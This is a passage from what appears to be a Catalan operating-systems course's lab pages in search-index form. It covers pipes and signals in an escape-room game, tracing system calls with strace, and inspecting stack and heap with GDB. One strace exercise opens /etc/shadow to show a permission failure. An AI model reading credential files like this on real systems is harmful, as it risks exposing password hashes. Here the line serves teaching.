    "section": "🧩 jugador.c",
    "text": "🧩 jugador.c\nEl codi jugador el teniu a continuació amb algunes seccions marcades com a TODO que heu de completar. Si compileu i executeu el codi tal qual està ara, veureu que cada jugador escriu un missatge a la sortida estàndard indicant que ha entrat a la sala. Heu de completar el codi per generar la clau aleatòria i esperar el senyal de finalització. La vostra missió és completar les seccions marcades com a TODO.\n#include &lt;time.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\n\nint main(int argc, char *argv[]) {\n\n    //TODO: Els misstges de log no han d'anar a stdout sinó a stderr\n\n    char s[100];\n    sprintf(s, \"--- Jugador %d ha entrat a la sala\\n\", getpid());\n    write(1, s, strlen(s));\n\n    // TODO: Gestionar senyal SIGUSR1 per acabar el procés\n    int n = 4;\n    char pass[n];\n    srand(time(NULL) + getpid());\n\n    // TODO: Generar 4 caràcters aleatoris (per ex. 'A' + rand() % 26)\n    // TODO: Enviar els caràcters al pare mitjançant pipe\n\n    sprintf(s, \"--- La clau generada pel jugador %d és: %s\\n\", getpid(), pass);\n    write(1, s, strlen(s));\n\n    //TODO: Esperar senyal de finalització (SIGUSR1)\n    return 0;\n}\nAquest codi s’executa aparentment bé, però amaga un error subtil: utilitza una variable no inicialitzada per imprimir la clau generada. Això pot provocar comportaments erràtics, valors aleatoris o fins i tot fallades d’execució segons l’estat de la memòria. Aquest tipus d’error és molt freqüent en programes amb punters i comunicació entre processos, i pot ser molt difícil de detectar només amb proves manuals.\nPer comprovar si el vostre programa pateix aquest problema, utilitzeu l’eina Valgrind, que permet rastrejar errors de memòria com:\n\nÚs de variables no inicialitzades.\nLectura o escriptura fora dels límits d’un buffer.\nFuites de memòria (malloc sense free).\nErrors en la gestió de punters.\n\nExecuteu el vostre programa amb Valgrind de la següent manera:\nvalgrind ./jugador\nA la sortida, Valgrind us indicarà exactament quina línia accedeix a memòria no inicialitzada o allibera memòria incorrectament.\nPer instal·lar Valgrind en sistemes basats en Debian o Ubuntu:\nsudo apt-get install valgrind\n\n\n\n\n\n\nAlertaRecomanació\n\n\n\nDurant tot el laboratori, executeu sempre el vostre codi amb Valgrind abans de donar-lo per bo. Un programa que funciona però genera errors de memòria no es considera correcte.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#sala.c",
    "href": "labs/05-procs/lab02.html#sala.c",
    "title": "Escape Room entre processos amb Pipes",
    "section": "🧩 sala.c",
    "text": "🧩 sala.c\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;errno.h&gt;\n\nchar *color_blue   = \"\\033[01;34m\";\nchar *color_end    = \"\\033[00m\";\nchar *color_red    = \"\\033[01;31m\";\nchar *color_green  = \"\\033[01;32m\";\n\nchar *args[] = {\"jugador\", \"jugador\", NULL};\n\n// TODO: Funcionalitat per gestionar l'alarma (SIGALRM)\n\nint main(int argc, char *argv[]) {\n    int fd[2];\n    char s[100];\n    int *pids;\n    int tempsPartida, numJugadors;\n    char *clau;\n\n    if (argc &lt; 4) {\n        fprintf(stderr, \"Ús: %s tempsPartida numJugadors clau\\n\", argv[0]);\n        exit(1);\n    }\n\n    //TODO: Llegir arguments\n    //TODO: Definir l'acció per a la senyal SIGALRM\n\n    sprintf(s, \"Inici del Room Escape [%d] (%d segons)\\n\", getpid(), tempsPartida);\n    write(1, s, strlen(s));\n\n    sprintf(s, \"--- Entren %d jugadors a la sala\\n\", numJugadors);\n    write(1, s, strlen(s));\n\n    sprintf(s, \"--- La clau secreta és: %s\\n\", clau);\n    write(1, s, strlen(s));\n\n    /* TODO 2: Crear processos fills (jugadors) amb fork() */\n\n    alarm(tempsPartida);\n\n    //TODO 3: Esperar respostes dels jugadors mitjançant pipe\n    // Si algun jugador encerta la clau, mostrar missatge de victòria i acabar\n\n    //TODO 5: Gestionar finalització en funció de si s'ha encertat la clau o ha sonat l'alarma\n\n    // TODO 6: Mostrar missatge final segons resultat\n\n    exit(0);\n}",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#extensió-ou-de-pasqua-amb-fifo",
    "href": "labs/05-procs/lab02.html#extensió-ou-de-pasqua-amb-fifo",
    "title": "Escape Room entre processos amb Pipes",
    "section": "🥚 Extensió: Ou de pasqua amb FIFO",
    "text": "🥚 Extensió: Ou de pasqua amb FIFO\nCanvia el programa per utilitzar un FIFO en lloc d’un pipe. D’aquesta manera, un procés extern pot ajudar els jugadors enviant la clau correcta.\n\nCrea un FIFO amb mkfifo().\nUtilitza aquesta FIFO per escriure i llegir les claus generades pels jugadors enlloc del pipe.\nAllibera el FIFO al final del programa amb unlink().\n\nPer testar el FIFO, pots utilitzar la comanda echo des d’un altre terminal per enviar la clau correcta.\necho \"AAAA\" &gt; myfifo",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#makefile",
    "href": "labs/05-procs/lab02.html#makefile",
    "title": "Escape Room entre processos amb Pipes",
    "section": "📄 Makefile",
    "text": "📄 Makefile\nPrepareu un Makefile per compilar els fitxers sala.c i jugador.c. Permeteu compilar, netejar i executar el programa amb diferents paràmetres.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#exercicis-addicionals",
    "href": "labs/05-procs/lab02.html#exercicis-addicionals",
    "title": "Escape Room entre processos amb Pipes",
    "section": "📚 Exercicis addicionals",
    "text": "📚 Exercicis addicionals\n\nCanvia el missatge que envia cada jugador per una estructura amb punters:\ntypedef struct {\n    pid_t pid;\n    char *clau;   \n} missatge_jugador;\nModifica el programa per permetre l’enviament de pistes als jugadors des del procés pare. Per exemple:\n\nEls jugadors poden enviar SIGUSR2 per demanar una pista.\nEl pare respondrà enviant un missatge pel pipe amb una pista. Per exemple, la primera lletra de la clau és ‘A’. Cada pista permet reduir l’espai de cerca. Únicament es poden donar \\(n-1\\) pistes on \\(n\\) és la longitud de la clau.\n\nImplementa un scape room competitiu on cada jugador és un procés independent que competeix per trobar la clau abans que els altres. Al final, de la partida, s’ha de mostrar un ranking amb el nombre d’intents i el temps emprat per cada jugador.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html",
    "href": "labs/03-syscalls/lab01.html",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "",
    "text": "En aquest laboratori us proposo utiltzar el programa strace per espiar el comportament del kernel. Aquesta eina ens permetrà veure les crides a sistema que es fan des d’un programa en execució. Això ens permetrà entendre com interactuen els programes amb el sistema operatiu.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 · Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#preparació",
    "href": "labs/03-syscalls/lab01.html#preparació",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "Preparació",
    "text": "Preparació\n\nAccediu a la màquina virtual Debian i instal·leu el paquet strace:\nsu -c \"apt install strace -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 · Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#strace",
    "href": "labs/03-syscalls/lab01.html#strace",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "strace",
    "text": "strace\nStrace és una eina que permet monitoritzar i fer un seguiment de les crides al sistema que realitza un programa.\n\nQuines crides a sistema utilitza el procés?\nQuins fitxers esta utilitzant l’aplicació?\nQuins arguments es passen a les crides a sistema?\nQuines crides a sistema estan fallant, i per què?\n\nEl seu funcionament es basa en la crida a sistema ptrace, que permet a un procés monitoritzar i controlar un altre procés.\nPer comenzar a utilitzar strace, simplement executa la comanda següent:\nstrace cat /dev/null\nAquest exemple mostra totes les crides a sistema realitzades pel programa cat, que en aquest cas, no fa res perquè /dev/null és un fitxer buit.\nSi volem filtrar per crides específiques, podem fer-ho així:\nstrace -e trace=close cat /dev/null\nEn aquest cas, només veurem les crides close que fa el programa cat.\nSi volem filtrar per crides que comencin per un patró, podem fer-ho així:\nstrace -e trace=/get* ls\nAquest exemple mostra totes les crides que comencin per get que fa el programa ls.\nPer guardar la sortida en un fitxer, podem fer-ho així:\nstrace -o strace.log -e trace=open,close ls\nAixò desarà totes les crides open i close en un fitxer anomenat strace.log.\nSi necessitem excloure una crida a sistema en particular, com gettimeofday, podem fer-ho així:\nstrace -o strace.log -e trace!=gettimeofday ls\nPer filtrar per categories de crides a sistema, podem fer-ho així:\nstrace -o strace.log -e trace=%{X} ls\nOn {X} representa la categoria que t’interessa.\nEls filtres a strace es poden classificar en diverses categories per facilitar la depuració i l’anàlisi:\n\n%file: Inclou totes les crides a sistema que impliquen fitxers com a arguments.\n%desc: Comprèn les crides a sistema relacionades amb descriptors de fitxers.\n%process: Inclou les crides a sistema que gestiona processos.\n%network: Inclou les crides a sistema relacionades amb la xarxa.\n%signal: Inclou les crides a sistema que gestionen senyals.\n%memory: Inclou les crides a sistema que es relacionen amb la gestió de la memòria.\n%ipc: Inclou les crides a sistema relacionades amb la comunicació interprocessual.\n%fs: Inclou les crides a sistema relacionades amb el sistema de fitxers.\n%all: Inclou totes les crides a sistema.\n\nPer exemple, si volem veure totes les crides a sistema relacionades amb la xarxa, podem fer-ho així:\nstrace -o strace.log -e trace=%network ls\nAddicionalment, strace ens permet obtenir un resum de les crides a sistema que fa un programa. Per exemple, si volem veure un resum de les crides a sistema que fa cat, podem fer-ho així:\nstrace -c cat /dev/null",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 · Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#exemple-strace-amb-un-hola-món",
    "href": "labs/03-syscalls/lab01.html#exemple-strace-amb-un-hola-món",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "Exemple: strace amb un Hola Món",
    "text": "Exemple: strace amb un Hola Món\nEl següent programa C escriu un missatge a la sortida estàndard i finalitza:\n#include &lt;stdio.h&gt;  // printf\n#include &lt;stdlib.h&gt; // exit\n\n#define STR \"HELLO\\n\"\n\nint main(int argc, char *argv[]) {\n    printf(\"%s\", STR);\n    exit(0);          \n}\n\nCompileu el programa:\ngcc hola.c -o hola \nExecuteu el programa amb strace:\nstrace -o hola.log ./hola\nConsulteu el fitxer hola.log per veure les crides a sistema que fa el programa hola.\nless hola.log\n\n\nAnalitzant la sortida\n\nLa primera línia ens mostra la crida a sistema execve que s’ha fet per executar el programa hola. Quan es crea un nou procés a Linux fork(), el fill és idèntic al pare. Llavors, execv() substitueix el procés actual (fill) pel programa hola.c. Aquest efecte s’anomena recobriment. Com veurem més endavant, aquesta crida a sistema és la que ens permet executar un nou programa.\nLa segona línia ens mostra la crida a sistema brk que ens permet ajustar el límit superior de l’heap, permetent al programa sol·licitar més memòria dinàmica. L’adreça retornada marca el límit actual de l’heap.\nLa tercera línia ens mostra la crida a sistema mmap que ens permet mapejar una regió de memòria. En aquest cas, el programa hola mapeja una regió de memòria de 8192 bytes amb permisos de lectura i escriptura. Aquesta memòria s’utilitza per emmagatzemar dades temporals durant l’execució del programa. Ens mostra l’adreça on s’ha mapejat la regió de memòria.\nLa quarta línia ens mostra la crida a sistema faccessat que ens permet comprovar si un fitxer es pot llegir. En aquest cas, el programa hola intenta llegir el fitxer /etc/ld.so.preload, però com que no existeix, la crida retorna ENOENT (El fitxer o directori no existeix).\n\nNota: Tots els programes intenten obrir /etc/ld.so.preload, aquest comportament està integrat a Glibc. Normalment /etc/ld.so.preload no existeix, així que cada procés només crida access, rep una resposta negativa i segueix endavant.\n\nLa cinquena línia ens mostra la crida a sistema openat que ens permet obrir un fitxer. En aquest cas, el programa hola intenta obrir el fitxer /etc/ld.so.cache en mode lectura. El valor de retorn és 3, que és el descriptor de fitxer que s’ha obert.\nLa sisena línia ens mostra la crida a sistema newfstatat que ens permet obtenir informació sobre un fitxer com ara el seu estat, propietari, permisos, últim accés, etc. El valor de retorn ens indica que la crida ha estat satisfactòria.\nLa setena línia ens mostra la crida a sistema mmap que ens permet mapejar una regió de memòria. En aquest cas, mapeja una regió de memòria de 20870 bytes amb permisos de lectura. Això es fa perquè el programa necessita llegir la informació del fitxer /etc/ld.so.cache. El valor de retorn ens indica l’adreça on s’ha mapejat la regió de memòria.\nLa vuitena línia ens mostra la crida a sistema close que ens permet tancar un fitxer. En aquest cas, /etc/ld.so.cache. El valor de retorn ens indica que la crida ha estat satisfactòria. I el descriptor de fitxer 3 ja no està disponible.\nPer fer servir la llibreria libc.so.6 que conté la implementació de les funcions bàsiques del llenguatge C, aquesta ha de ser carregada a la memòria. Els passos són els següents:\n\nLa crida a sistema openat obre la llibreria libc.so.6 en mode lectura. El valor de retorn és 3, que és el descriptor de fitxer que s’ha obert.\nLa crida a sistema read llegeix 832 bytes de la llibreria libc.so.6. El valor de retorn ens indica que s’han llegit 832 bytes. Aquesta informació és la capçalera que té format ELF.\nLa crida a sistema newfstatat ens permet obtenir informació sobre la llibreria libc.so.6.\nLa crida a sistema mmap mapeja una regió de memòria de 1826912 bytes amb permisos de lectura.\nLa crida a sistema mmap mapeja una regió de memòria de 1761376 bytes amb permisos d’execució. Aquesta memòria es fa servir per executar la llibreria libc.so.6. El valor de retorn ens indica l’adreça on s’ha mapejat la regió de memòria.\nLes crides munmap alliberen regions de memòria que ja no es fan servir. En aquest cas, la llibreria libc.so.6 ja no necessita llegir la capçalera ELF.\nLa crida a sistema mprotect canvia els permisos d’una regió de memòria a PROT_NONE (sense permisos). Aquesta regió de memòria ja no es fa servir.\nLes crides mmap mapegen dos regions de memòria de 24576 i 49248 bytes amb permisos de lectura i escriptura per emmagatzemar dades temporals durant l’execució de la llibreria libc.so.6. El valor de retorn ens indica les adreces on s’han mapejat les regions de memòria (0xffff833bc000 i 0xffff833c2000).\nLa crida a sistema close tanca la llibreria libc.so.6. El valor de retorn ens indica que la crida ha estat satisfactòria. I el descriptor de fitxer 3 ja no està disponible.\n\n\nNo comentarem les crides a sistema set_tid_address, set_robust_list, rseq, prlimit64, getrandom ja que no són rellevants per aquest exemple i les veurem més endavant.\n\nLes següents crides a sistema mprotect canvien els permisos a PROT_READ (només lectura) de diferents regions de memòria. La primera regió de memòria és de 16384 bytes, la segona de 4096 bytes i la tercera de 8192 bytes.\nLa crida a sistema newfstatat ens permet obtenir informació sobre la sortida estàndard. Fixeu-vos que el descriptor de fitxer és 1. L’objectiu del programa en C es mostrar el missatge HELLO per la sortida estàndard.\nLes crides brk(NULL) i brk(0xaaaadad16000) primer obtenen l’adreça final de la pila i després ajusten el límit superior de l’heap. Es a dir, el programa augmenta la mida de l’heap per emmagatzemar la cadena HELLO\\n abans d’escriure-la per la sortida estàndard.\n\nNota: Tot i que no s’utiltiza la memòria dinàmica de forma explícita, la crida a sistema write(1, \"HELLO\\n\", 6) fa servir la memòria dinàmica per emmagatzemar la cadena HELLO\\n abans d’escriure-la per la sortida estàndard. Podeu comprovar-ho si mirem la implementació de la funció printf de la llibreria libc.so.6.\n\nLa crida a sistema write escriu 6 caràcters a la sortida estàndard. En aquest cas, el programa hola escriu la cadena HELLO\\n per la sortida estàndard. El valor de retorn ens indica que s’han escrit 6 caràcters.\nLa crida a sistema exit_group finalitza el programa hola. El valor de retorn és 0, que indica que el programa ha finalitzat correctament.\n\nNota: La crida a sistema exit_group és la que s’utilitza per finalitzar un procés. Aquesta crida finalitza tots els fils del procés i allibera tots els recursos que s’han utilitzat. Si observeu el manual de la crida a sistema exit (man 2 exit), veureu que aquesta crida invoca la crida a sistema del kernel amb el mateix nom. Des de la versió 2.3 de Glibc, la funció exit invoca la crida a sistema exit_group per tal de finalitzar tots els fils d’un procés.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 · Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#exercici-opcional-strace-amb-un-programa-que-obre-un-fitxer",
    "href": "labs/03-syscalls/lab01.html#exercici-opcional-strace-amb-un-programa-que-obre-un-fitxer",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "Exercici Opcional: strace amb un programa que obre un fitxer",
    "text": "Exercici Opcional: strace amb un programa que obre un fitxer\n\nCreeu un fitxer anomenat open.c amb el següent codi:\nint main(int argc, char *argv[]) {\n    int fd;\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s &lt;file&gt;\\n\", argv[0]);\n        exit(1);\n    }\n    fd = open(argv[1], O_RDONLY);\n    if (fd == -1) {\n        perror(\"open\");\n        exit(1);\n    }\n    close(fd);\n    return 0;\n}\nAquest programa obre un fitxer en mode lectura i el tanca. Si no es passa cap argument, mostra un missatge d’ús.\nCompileu el programa:\ngcc -o open open.c\nExecuteu el programa amb strace:\nstrace -o open_1.log ./open /etc/passwd\nExecuteu el programa amb strace:\nstrace -o open_2.log ./open /etc/shadow\n\nObriu els fitxers open_1.log i open_2.log amb un editor de text o amb la comanda less i analitzeu el seu comportament i les diferències entre ells.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 · Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html",
    "href": "labs/02-c-pointers/lab01.html",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "",
    "text": "Com es guarden les dades a la stack i a la heap.\nLa diferència entre una matriu estàtica i una matriu dinàmica.\nEl paper dels punters en l’assignació de memòria.\nCom explorar la memòria amb GDB.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 · Punters·Heap·Stack en C"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html#objectius",
    "href": "labs/02-c-pointers/lab01.html#objectius",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "",
    "text": "Com es guarden les dades a la stack i a la heap.\nLa diferència entre una matriu estàtica i una matriu dinàmica.\nEl paper dels punters en l’assignació de memòria.\nCom explorar la memòria amb GDB.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 · Punters·Heap·Stack en C"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html#codi-base-per-al-laboratori",
    "href": "labs/02-c-pointers/lab01.html#codi-base-per-al-laboratori",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "Codi base per al laboratori",
    "text": "Codi base per al laboratori\nUtilitzarem el següent codi base per al laboratori. Aquest codi crea una matriu estàtica i una dinàmica, i imprimeix els valors i les adreces de memòria corresponents.\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    // Matriu ESTÀTICA: a la pila (stack)\n    int m[2][3] = { {1, 2, 3}, {4, 5, 6} };\n\n    printf(\"Matriu ESTÀTICA (m):\\n\");\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 3; j++) {\n            printf(\"m[%d][%d] = %d (adreça: %p)\\n\",\n                   i, j, m[i][j], &m[i][j]);\n        }\n    }\n\n    // Matriu DINÀMICA: a la memòria heap\n    int **matrix = malloc(2 * sizeof(int *));  // espai per 2 files\n\n    for (int i = 0; i &lt; 2; i++) {\n        matrix[i] = malloc(3 * sizeof(int));  // espai per 3 enters\n    }\n\n    // Copiem els valors de la matriu estàtica\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 3; j++) {\n            matrix[i][j] = m[i][j];\n        }\n    }\n\n    printf(\"\\nMatriu DINÀMICA (matrix):\\n\");\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 3; j++) {\n            printf(\"matrix[%d][%d] = %d (adreça: %p)\\n\",\n                   i, j, matrix[i][j], &matrix[i][j]);\n        }\n    }\n\n    // Alliberem la memòria del heap\n    for (int i = 0; i &lt; 2; i++) {\n        free(matrix[i]);\n    }\n    free(matrix);\n\n    return 0;\n}\nSi compileu i executeu aquest codi, veureu que les adreces de la matriu estàtica m estan a la pila (stack), mentre que les adreces de la matriu dinàmica matrix estan a la memòria heap:\ngcc -g lab01.c -o lab01\n./lab01\nMatriu ESTÀTICA (m):\nm[0][0] = 1 (adreça: 0xffffde4ce200)\nm[0][1] = 2 (adreça: 0xffffde4ce204)\nm[0][2] = 3 (adreça: 0xffffde4ce208)\nm[1][0] = 4 (adreça: 0xffffde4ce20c)\nm[1][1] = 5 (adreça: 0xffffde4ce210)\nm[1][2] = 6 (adreça: 0xffffde4ce214)\n\nMatriu DINÀMICA (matrix):\nmatrix[0][0] = 1 (adreça: 0xaaaae56f96d0)\nmatrix[0][1] = 2 (adreça: 0xaaaae56f96d4)\nmatrix[0][2] = 3 (adreça: 0xaaaae56f96d8)\nmatrix[1][0] = 4 (adreça: 0xaaaae56f96f0)\nmatrix[1][1] = 5 (adreça: 0xaaaae56f96f4)\nmatrix[1][2] = 6 (adreça: 0xaaaae56f96f8)\nSi dibuixem un mapa de la memòria d’aquest programa, molt simplificat, tindríem:\n\nOn:\n\n@m: és la base de la matriu estàtica, i com a variable local està al stack. Els seus elements també són al stack utilitzant adreces consecutives.\n@matrix: és el punter a la matriu dinàmica, i com a variable local també està al stack.\n@matrix[0], @matrix[1]: són punters que apunten a blocs de memòria al heap, on s’han assignat espai per a les files de la matriu dinàmica.\n@z: és l’adreça del punter matrix al stack.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 · Punters·Heap·Stack en C"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html#tasques",
    "href": "labs/02-c-pointers/lab01.html#tasques",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "Tasques",
    "text": "Tasques\n\nCompilar i execució amb GDB\n\nCompila el codi amb les opcions de depuració: gcc -g lab01.c -o lab01.\nExecuta el programa amb GDB: gdb ./lab01.\n\n\n\n\n\n\n\nAlertaGDB no està instal·lat?\n\n\n\nAssegura’t de tenir GDB instal·lat al teu sistema. Per instal·lar-lo, pots utilitzar el gestor de paquets del teu sistema (per exemple, su -c \"apt-get install gdb -y\" a Debian).\n\n\n\n\nExploració de la memòria amb GDB\nUn cop dins GDB, utilitza els següents comandos per a explorar el programa:\n\nbreak main per posar un punt d’interrupció al principi de la funció main.\n(gdb) break main\nBreakpoint 1 at 0x860: file lab01.c, line 6.\nrun per iniciar l’execució del programa.\n(gdb) run\nStarting program: /home/jordi/c/pointers/lab01\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/aarch64-linux-gnu/libthread_db.so.1\".\n\nBreakpoint 1, main () at lab01.c:6\n6       int m[2][3] = { {1, 2, 3}, {4, 5, 6} };\nObserva que l’execució s’ha aturat a la línia 6, just abans de la declaració de la matriu estàtica m.\nAra posem un altre punt d’interrupció just abans del primer malloc per a la matriu dinàmica:\n(gdb) break 17\nBreakpoint 2 at 0xaaaaaaaa093c: file lab01.c, line 18.\nContinuem l’execució fins a aquest punt:\n(gdb) c\nContinuing.\nMatriu ESTÀTICA (m):\nm[0][0] = 1 (adreça: 0xfffffffff2a0)\nm[0][1] = 2 (adreça: 0xfffffffff2a4)\nm[0][2] = 3 (adreça: 0xfffffffff2a8)\nm[1][0] = 4 (adreça: 0xfffffffff2ac)\nm[1][1] = 5 (adreça: 0xfffffffff2b0)\nm[1][2] = 6 (adreça: 0xfffffffff2b4)\n\nBreakpoint 2, main () at lab01.c:17\n17      int **matrix = malloc(2 * sizeof(int *));  // espai per 2 files\nAra estem just abans de l’assignació de memòria dinàmica. Podem començar a inspeccionar la pila i la memòria heap.\n\n(gdb) info proc mappings\nprocess 1404\nMapped address spaces:\n    Start Addr           End Addr       Size     Offset  Perms  objfile\n0xaaaaaaaa0000     0xaaaaaaaa1000     0x1000        0x0  r-xp   /home/jordi/c/pointers/lab01\n0xaaaaaaabf000     0xaaaaaaac0000     0x1000     0xf000  r--p   /home/jordi/c/pointers/lab01\n0xaaaaaaac0000     0xaaaaaaac1000     0x1000    0x10000  rw-p   /home/jordi/c/pointers/lab01\n0xaaaaaaac1000     0xaaaaaaae2000    0x21000        0x0  rw-p   [heap]\n0xfffff7e00000     0xfffff7f8b000   0x18b000        0x0  r-xp   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7f8b000     0xfffff7f9c000    0x11000   0x18b000  ---p   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7f9c000     0xfffff7fa0000     0x4000   0x18c000  r--p   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7fa0000     0xfffff7fa2000     0x2000   0x190000  rw-p   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7fa2000     0xfffff7faf000     0xd000        0x0  rw-p\n0xfffff7fbe000     0xfffff7fe5000    0x27000        0x0  r-xp   /usr/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1\n0xfffff7ff7000     0xfffff7ff9000     0x2000        0x0  rw-p\n0xfffff7ff9000     0xfffff7ffb000     0x2000        0x0  r--p   [vvar]\n0xfffff7ffb000     0xfffff7ffc000     0x1000        0x0  r-xp   [vdso]\n0xfffff7ffc000     0xfffff7ffe000     0x2000    0x2e000  r--p   /usr/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1\n0xfffff7ffe000     0xfffff8000000     0x2000    0x30000  rw-p   /usr/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1\n0xfffffffdf000    0x1000000000000    0x21000        0x0  rw-p   [stack]   \n\n\n\n\n\n\nNotaMapa de memòria\n\n\n\nEn aquest cas, la memòria heap comença a l’adreça 0xaaaaaaac1000 i acaba a 0xaaaaaaae2000 amb una mida de 0x21000 bytes (135168 bytes). La pila d’execució (stack) comença a 0xfffffffdf000 i s’estén fins a 0x1000000000000.\n\n\n\nTambé podem consultar les variables locals amb info locals.\n(gdb) info locals\nm = {{1, 2, 3}, {4, 5, 6}}\nmatrix = 0xaaaaaaaa0854 &lt;main&gt;\n\n\n\n\n\n\n\nNotaObservació\n\n\n\nObserva que m esta declarada i inicialitzada, mentre que matrix apunta a una adreça de memòria. Aquesta adreça de memòria esta guardada en un altra adreça de memòria (la del punter matrix ,@z). Pots consultar aquesta adreça amb print &matrix.\n(gdb) print &matrix\n$1 = (int ***) 0xfffffffff2b8\n(gdb) print matrix\n$2 = (int **) 0xaaaaaaaa0854 &lt;main&gt;\n\n\n\nAra anem a consultar la informació sobre la variable m:\n(gdb) print &m\n$1 = (int (*)[2][3]) 0xfffffffff2a0\n(gdb) print &m[0]\n$2 = (int (*)[3]) 0xfffffffff2a0\n(gdb) print &m[1]\n$3 = (int (*)[3]) 0xfffffffff2ac\n\n\n\n\n\n\n\nNotaObservació\n\n\n\nObserva que l’adreça de m està a la pila d’execució (al voltant de 0xfffffffff2a0). I les adreces de m[0] i m[1] són consecutives (incrementen en 12 bytes, que és la mida d’una fila de 3 enters).\n\n\n\nAccedim al primer element de la matriu estàtica amb print m[0][0].\n(gdb) print &m[0][0] # Ens imprimeix l'adreça del primer element de la matriu estàtica\n$2 = (int *) 0xfffffffff2a0\n(gdb) print m[0][0] # Ens imprimeix el valor del primer element de la matriu estàtica\n$3 = 1\nAccedim al segon element de la matriu estàtica amb print m[0][1].\n(gdb) print &m[0][1] # Ens imprimeix l'adreça del segon element de la matriu estàtica\n$4 = (int *) 0xfffffffff2a4\n(gdb) print m[0][1] # Ens imprimeix el valor del segon element de la matriu estàtica\n$5 = 2\nAccedim al tercer element de la matriu estàtica amb print m[0][2].\n(gdb) print &m[0][2] # Ens imprimeix l'adreça del tercer element de la matriu estàtica\n$6 = (int *) 0xfffffffff2a8\n(gdb) print m[0][2] # Ens imprimeix el valor del tercer element de la matriu estàtica\n$7 = 3\nAccedim al primer element de la segona fila de la matriu estàtica amb print m[1][0].\n(gdb) print &m[1][0] # Ens imprimeix l'adreça del primer element de la segona fila de la matriu estàtica\n$8 = (int *) 0xfffffffff2ac\n(gdb) print m[1][0] # Ens imprimeix el valor del primer element de la segona fila de la matriu estàtica\n$9 = 4\nAccedim al segon element de la segona fila de la matriu estàtica amb print m[1][1].\n(gdb) print &m[1][1] # Ens imprimeix l'adreça del segon element de la segona fila de la matriu estàtica\n$10 = (int *) 0xfffffffff2b0\n(gdb) print m[1][1] # Ens imprimeix el valor del segon element de la segona fila de la matriu estàtica\n$11 = 5\nAccedim al tercer element de la segona fila de la matriu estàtica amb print m[1][2].\n(gdb) print &m[1][2] # Ens imprimeix l'adreça del tercer element de la segona fila de la matriu estàtica\n$12 = (int *) 0xfffffffff2b4\n(gdb) print m[1][2] # Ens imprimeix el valor del tercer element de la segona fila de la matriu estàtica\n$13 = 6\nUna forma alternativa de veure els valors i les adreces de la matriu estàtica m és utilitzant el comandament x per examinar la memòria. Aquí, x/6dw indica que volem veure 6 valors (6) en format decimal (d) i com a enters (w), començant des de l’adreça de m[0][0].\n(gdb) x/6dw &m[0][0]\n0xfffffffff2a0: 1   2   3   4\n0xfffffffff2b0: 5   6\n\n\n\n\n\n\n\nNotaAdreces consecutives\n\n\n\nObserveu que les adreces dels elements de la matriu estàtica són consecutives (incrementen en 4 bytes, que és la mida d’un enter). Podeu confirmar la mida d’un enter al gdb amb:\n(gdb) print sizeof(int)\n$14 = 4\n\n\n\nAra anem a inspeccionar la 